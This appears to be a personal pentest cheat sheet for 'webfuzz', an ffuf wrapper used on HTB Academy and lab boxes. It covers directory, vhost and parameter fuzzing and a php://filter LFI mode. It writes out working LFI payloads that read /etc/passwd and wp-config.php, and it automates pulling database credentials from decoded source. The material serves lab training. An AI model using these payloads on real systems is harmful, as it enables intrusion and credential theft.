---
title: "webfuzz"
description: "brew install ffuf"
category: tools
tags: ["tools"]
tools: ["ffuf", "Gobuster"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Tools/webfuzz.md"
---
# Requirements: ffuf, python3, curl (all present on the working box). SecLists optional.
brew install ffuf

# System-wide, no sudo (already done, and ~/.local/bin is first on PATH)
ln -sf "/Volumes/bmdrbeKUVgvV/Cybersecurity/Code/webfuzz/webfuzz.py" ~/.local/bin/webfuzz

# System-wide in /usr/local/bin (needs sudo, that dir is root-owned)
sudo ln -sf "/Volumes/bmdrbeKUVgvV/Cybersecurity/Code/webfuzz/webfuzz.py" /usr/local/bin/webfuzz

# Point at a real SecLists install for full-size wordlists (add to ~/.zshrc)
export WEBFUZZ_SECLISTS="$HOME/tools/SecLists"

webfuzz -h            # sanity check
```

> [!warning]+ Vault-mounted caveat
> `ris:Radar`
> 1. The tool lives on the Cryptomator vault, so the symlink only resolves while that vault is **mounted**.
> 2. To use it even when the vault is locked, copy the `webfuzz/` folder to somewhere permanent (e.g. `~/tools/webfuzz`) and repoint the symlink there.
> 3. *The script resolves its own real path, so a symlink still finds its bundled wordlists.*

---

## Modes overview `ris:Command`

| Mode | Fuzzes | Minimal command |
|---|---|---|
| `dir` | directories `URL/FUZZ` | `webfuzz dir -u http://t/` |
| `page` | page names `URL/FUZZ.php` | `webfuzz page -u http://t/blog/` |
| `ext` | extensions `URLFUZZ` | `webfuzz ext -u http://t/blog/index` |
| `recurse` | dirs recursively (+`.php`, `-v`) | `webfuzz recurse -u http://t/` |
| `dns` | public sub-domains `FUZZ.domain` | `webfuzz dns -d inlanefreight.com --scheme https` |
| `vhost` | `Host: FUZZ.domain` (auto `-fs`) | `webfuzz vhost -u http://IP/ -d domain` |
| `getparam` | GET param names `?FUZZ=key` | `webfuzz getparam -u http://t/a.php` |
| `postparam` | POST param names `-d FUZZ=key` | `webfuzz postparam -u http://t/a.php` |
| `value` | a param's value `id=FUZZ` | `webfuzz value -u http://t/a.php -p id --range 1-1000` |
| `lfi` | filenames via `php://filter` + decode | `webfuzz lfi -u 'http://t/nav.php?page=FUZZ' --resource /var/www/html/` |

---

## Content discovery `ris:ShareBox`

```bash
# Directories:  URL/FUZZ
webfuzz dir -u http://10.10.10.10/

# Page names under a directory:  /blog/FUZZ.php  (change ext with --ext)
webfuzz page -u http://10.10.10.10/blog/ --ext php

# Extensions on a known file:  /blog/indexFUZZ
webfuzz ext -u http://10.10.10.10/blog/index

# Recursive dirs, auto-adds -e .php and -v so you see which file is where
webfuzz recurse -u http://10.10.10.10/ --depth 1

# Add extensions / recursion to any dir run yourself
webfuzz dir -u http://10.10.10.10/ -e .php,.txt,.html -R --depth 2
```

> [!info]+ ffuf equivalent
> `ris:Command`
> `webfuzz dir -u http://t/` becomes
> `ffuf -w <list>:FUZZ -u http://t/FUZZ -ic -c` (plus an auto `-fs` only if the server soft-404s).

---

## Sub-domains and VHosts `ris:GlobalLine`

```bash
# Public sub-domains via real DNS (note: public academy example uses https)
webfuzz dns -d inlanefreight.com --scheme https

# VHosts on one IP via Host-header fuzzing — auto-calibrates -fs for you
webfuzz vhost -u http://10.129.203.101/ -d inlanefreight.local

# Your original manual command, one-lined and auto-filtered:
webfuzz vhost -u http://10.129.203.101/ -d inlanefreight.local -w namelist.txt
```

> [!example]+ What the vhost auto-`-fs` replaces
> `ris:Scan2`
> The raw command you used to type:
> ```bash
> ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
> ```
> With webfuzz, the `-fs 15157` is discovered automatically by probing a couple of random `*.inlanefreight.local` hosts. Pass `--fs 15157` yourself to skip calibration, or `--no-auto` to disable it.

---

## Parameter and value fuzzing `ris:LockPassword`

```bash
# GET parameter NAME:  /admin/admin.php?FUZZ=key
webfuzz getparam -u http://admin.academy.htb:PORT/admin/admin.php

# POST parameter NAME:  -d 'FUZZ=key' with urlencoded content-type
webfuzz postparam -u http://admin.academy.htb:PORT/admin/admin.php

# VALUE of a known parameter, numeric range wordlist generated on the fly
webfuzz value -u http://admin.academy.htb:PORT/admin/admin.php -p id --range 1-1000

# VALUE fuzzing over GET instead of POST, with a custom wordlist
webfuzz value -u http://t/a.php -p user --method GET -w /path/users.txt
```

> [!info]+ Command Breakdown
> `ris:FileList`
> 1. **`--value`** (getparam/postparam) sets the placeholder value sent with each fuzzed name; default is `key`.
> 2. **`-p / --param`** (value mode) is the fixed parameter name whose value you are brute-forcing.
> 3. **`--range A-B`** writes a numeric wordlist `A..B` to `webfuzz-out/` and uses it — the classic `for i in $(seq 1 1000)` trick, built in.
> 4. All three auto-calibrate `-fs` from a random-parameter/value baseline, so the default "invalid" response is filtered automatically.

---

## PHP-filter base64 LFI (the Dante trick) `ris:KnifeBlood`

```bash
# One command: wrap, match PHP source, then auto curl + base64 -d every hit
webfuzz lfi -u 'http://172.16.1.10/nav.php?page=FUZZ' --resource /var/www/html/wordpress/
```

> [!success]+ What this automates
> `ris:Key`
> 1. Rewrites `FUZZ` into `php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/FUZZ`.
> 2. Adds `-mc all -mr PD9waH -fs 0` — `PD9waH` is base64 for `<?ph`, so only **real PHP source** matches and empty responses are dropped.
> 3. For every hit it `curl`s the URL, base64-decodes it, and saves the source to `webfuzz-out/decoded/`.
> 4. Scans the decoded files and prints any **URLs** and **DB creds / secrets** — i.e. the URL you are hunting for pops out on its own.

> [!example]+ The raw commands it replaces (straight from the Dante notes)
> `ris:Command`
> ```bash
> ffuf -w raft-medium-files.txt:FUZZ \
>   -u "http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/FUZZ" \
>   -mr "PD9waH" -fs 0
> curl -s "http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d
> ```

```bash
# Already wrote the full php://filter payload yourself? Skip the wrapping:
webfuzz lfi -u 'http://t/nav.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwdFUZZ' --no-wrap

# Read non-PHP files too (drops the PHP-only matcher, keeps -fs 0)
webfuzz lfi -u 'http://t/nav.php?page=FUZZ' --resource /etc/ --all

# Use the rot13 filter instead of base64
webfuzz lfi -u 'http://t/nav.php?page=FUZZ' --resource /var/www/ --conv rot13

# Find the files but decode them yourself later
webfuzz lfi -u 'http://t/nav.php?page=FUZZ' --resource /var/www/ --no-decode
```

---

## Common flags `fas:Screwdriver`

| Flag | Meaning |
|---|---|
| `--dry-run` | print the ffuf command, do not run it |
| `-w LIST` | wordlist: path, bundled name, or SecLists basename |
| `-t 200` | threads (default 40) · `--rate N` cap requests/sec |
| `-H 'X: Y'` | extra header (repeatable) · `-b 'a=b'` cookie · `-x URL` proxy |
| `-k` | ignore TLS cert errors (lab self-signed) |
| `-r` | follow redirects · `-e .php,.html` extensions |
| `-R --depth N` | recursion + depth |
| `--scheme https` | scheme when built from a domain · `--port N` inject a port |
| `--fs/--fc/--fw/--fl` `--mc/--mr/--ms/--mw/--ml` | pass any ffuf matcher/filter through (also disables auto `-fs`) |
| `--no-auto` | turn off webfuzz's automatic `-fs` calibration |
| `-A / --ac` | use ffuf's native `-ac` instead of webfuzz's baseline |
| `-o FILE` `--outdir DIR` | JSON output path / loot dir (default `./webfuzz-out`) |
| `-v` | verbose (full URLs) · `--no-color` plain output |

> [!info]+ Output
> `ris:FileList`
> 1. Live ffuf output plus a clean hit summary.
> 2. Machine-readable results at `webfuzz-out/<mode>-<timestamp>.json`.
> 3. LFI loot (decoded source) at `webfuzz-out/decoded/`.

---

## HTB module walkthrough, in order `fas:ClipboardList`

```bash
# 1. directories, recursively, with .php in one shot
webfuzz recurse -u http://SERVER_IP:PORT/

# 2. which extension does /blog use?
webfuzz ext -u http://SERVER_IP:PORT/blog/index

# 3. pages under /blog
webfuzz page -u http://SERVER_IP:PORT/blog/ --ext php

# 4. public sub-domains
webfuzz dns -d inlanefreight.com --scheme https

# 5. non-public vhosts on the same IP (auto -fs), then add admin.academy.htb to /etc/hosts
webfuzz vhost -u http://academy.htb:PORT/ -d academy.htb

# 6. find a working parameter (POST)
webfuzz postparam -u http://admin.academy.htb:PORT/admin/admin.php

# 7. brute the value of that parameter
webfuzz value -u http://admin.academy.htb:PORT/admin/admin.php -p id --range 1-1000
```

---

## Try it offline (no target) `ris:Global`

```bash
cd /Volumes/bmdrbeKUVgvV/Cybersecurity/Code/webfuzz/.selftest
python3 server.py 8099 &
webfuzz vhost -u http://127.0.0.1:8099/ -d inlanefreight.local          # finds admin
webfuzz value -u http://127.0.0.1:8099/admin/admin.php -p id --range 1-100   # finds 42
webfuzz lfi   -u 'http://127.0.0.1:8099/nav.php?page=FUZZ' --resource /var/www/html/wordpress/
kill %1
```

---

## Troubleshooting `fas:CircleXmark`

| Symptom | Cause | Fix |
|---|---|---|
| `wordlist not found: namelist.txt` | not in the current directory | `cd` to where the list is, or pass a full path to `-w` |
| Flooded with 200s in `vhost` | server returns the same page for every host and calibration missed it | pass `--fs <size>` manually, or use `-A` |
| Real dirs missing in `dir` | over-filtering on a soft-404 server | check the "auto-filtering with -fs" line; rerun with `--no-auto` or a manual `--fc` |
| `lfi` finds nothing | wrong `--resource` base path, or files are not PHP | verify the path, try `--all`, or a bigger `-w` list |
| `SecLists not found` warning | not installed / not discovered | set `WEBFUZZ_SECLISTS`, or ignore it and use the bundled lists |
| TLS errors on https lab box | self-signed cert | add `-k` |
| `webfuzz: command not found` | vault unmounted or symlink missing | remount the vault, or recreate the `~/.local/bin/webfuzz` symlink |

---

## Lessons Learned `fas:Lightbulb`

1. **`--dry-run` first when unsure.** It shows the exact ffuf line, which is both a learning aid and the thing you paste into a report.
2. **Let it calibrate `-fs`.** The auto-filter only triggers on catch-all servers, so leaving it on costs three requests and saves the manual size-hunting that made ffuf annoying.
3. **`vhost` needs a size filter, `dir` usually does not.** Wrong vhosts return the default site (a real 200), so size is the only discriminator; normal dir fuzzing already filters on the 404 status.
4. **`lfi` is the payoff.** The `php://filter` + `PD9waH` + auto base64-decode chain reads server-side source and surfaces the hidden URL/creds without a single manual `curl | base64 -d`.
5. **Anything after the known flags is raw ffuf.** When you need a knob the wrapper does not expose, just append it.

---

## References `fas:BookOpen`

1. [ffuf on GitHub](https://github.com/ffuf/ffuf)
2. [ffuf wiki](https://github.com/ffuf/ffuf/wiki)
3. [SecLists](https://github.com/danielmiessler/SecLists)
4. [PayloadsAllTheThings — File Inclusion / LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
5. [PHP php://filter wrapper](https://www.php.net/manual/en/wrappers.php.php)
6. HTB Academy — *Attacking Web Applications with Ffuf*
7. Related: ffuf_cheat_sheet · gobuster · LFI - Cheat Sheet

---

#Tools #webfuzz #ffuf #WebFuzzing #Enumeration #LFI #VHost #Cheatsheet
